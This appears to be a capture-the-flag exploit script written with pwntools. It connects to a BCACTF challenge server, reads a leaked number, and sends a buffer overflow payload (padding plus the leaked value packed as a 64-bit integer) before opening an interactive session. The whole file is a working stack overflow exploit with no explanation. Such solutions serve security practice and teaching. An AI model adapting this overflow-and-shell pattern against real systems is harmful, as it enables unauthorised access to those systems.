from pwn import *
context.update(os="linux", arch="i686")

PAYLOAD = ("A" * 64 + "BBBBBBBB").encode("ASCII")

#p = process("./analysis")
p = remote("bin.bcactf.com", 49158)
p.recvuntil("For example, here's a number: ")
d = int(p.recvuntil(".\n")[:-2])
PAYLOAD += p64(d)
print(hex(d))
p.recvuntil("> ")
p.sendline(PAYLOAD)
p.interactive()
